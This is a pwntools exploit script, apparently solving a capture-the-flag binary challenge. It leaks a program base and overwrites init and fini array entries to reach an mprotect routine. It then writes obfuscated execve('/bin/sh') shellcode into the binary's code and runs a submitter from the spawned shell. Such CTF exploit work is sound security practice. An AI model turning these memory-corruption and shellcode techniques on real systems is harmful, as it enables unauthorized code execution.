#!/usr/bin/env python3
from pwn import *
from ctypes import *

HOST = os.environ.get("HOST", "localhost")
PORT = 31337

local_ip = f"{HOST}:{PORT}"
context(os="linux", arch="amd64", log_level="debug")
proc_name = "./challenge"  # "./proc"
ld_path = ""  # "./ld-linux-x86-64.so.2"
libc_path = ""  # "./libc.so.6"
ip_addr = local_ip  # "node4.buuoj.cn:28354"
# ++++++++++++++++++++++++++++++++++++++++
if len(ip_addr):
    p = remote(ip_addr.split(":")[0], ip_addr.split(":")[1])
    if len(libc_path):
        libc = ELF(libc_path)
elif len(proc_name):
    elf = ELF(proc_name)
    if len(libc_path):
        if len(ld_path):
            p = process(
                [ld_path, proc_name],
                env={"LD_PRELOAD": libc_path},
            )
        else:
            p = process(proc_name, env={"LD_PRELOAD": libc_path})
        libc = ELF(libc_path)
    else:
        p = process(proc_name)
        libc = p.libc


# ++++++++++++++++++++++++++++++++++++++++
def int16(hexstr: str):
    return int(hexstr, 16)


def r(numb: int = None):
    return p.recv(numb)


def ru(delims: bytes):
    return p.recvuntil(delims, drop=True)


def s(data: bytes):
    return p.send(data)


def sa(delim: str, data: bytes):
    return p.sendafter(delim, data)


def sl(data: bytes):
    return p.sendline(data)


def sla(delim: str, data: bytes):
    return p.sendlineafter(delim, data)


def itr():
    return p.interactive()


def leak(desc: str, addr: int):
    return log.success(f"{desc} ==> {hex(addr)}")


def debug(gdbscript: str = "", terminal: str = ""):
    if terminal == "tmux":
        context.terminal = ["tmux", "splitw", "-h"]
    gdb.attach(p, gdbscript)
    pause()


# ++++++++++++++++++++++++++++++++++++++++
# debug("b * $rebase(0x2110)", "tmux")

# fmt: off
# fmt: on

prog_base = u64(r(8))

random_addr = prog_base + 0x45B4
init_array_second_addr = prog_base + 0x4330
preinit_mprotect_addr = prog_base + 0x1370
fini_array_first_addr = prog_base + 0x4338
shellcode_addr = prog_base + 0x2000
change_start_addr = prog_base + 0x2110
break_addr = prog_base + 0x4340

leak("prog_base", prog_base)
leak("random_addr", random_addr)
leak("init_array_second_addr", init_array_second_addr)
leak("preinit_mprotect_addr", preinit_mprotect_addr)
leak("fini_array_first_addr", fini_array_first_addr)
leak("init_array_first_addr", shellcode_addr)
leak("change_start", change_start_addr)
leak("break_addr", break_addr)

s(p64(random_addr))
s(p64(0))

s(p64(init_array_second_addr))
s(p64(preinit_mprotect_addr))

s(p64(fini_array_first_addr))
s(p64(shellcode_addr))

s(p64(0))

s(p64(1))

shellcode = """
xor     eax, eax
mov     rbx, 0xFF978CD091969DD1
neg     rbx
push    rbx
push    rsp
pop     rdi
cdq
push    rdx
push    rdi
push    rsp
pop     rsi
mov     al, 0x3b
syscall
"""
shellcode = asm(shellcode)
shellcode = shellcode.ljust(0x20, b"\x00")

s(p64(change_start_addr))
s(shellcode[:8])
s(p64(change_start_addr + 8))
s(shellcode[8:16])
s(p64(change_start_addr + 16))
s(shellcode[16:24])
s(p64(change_start_addr + 24))
s(shellcode[24:])

s(p64(break_addr))

r(1024)
sl(b"./submitter")
print(r(1024))
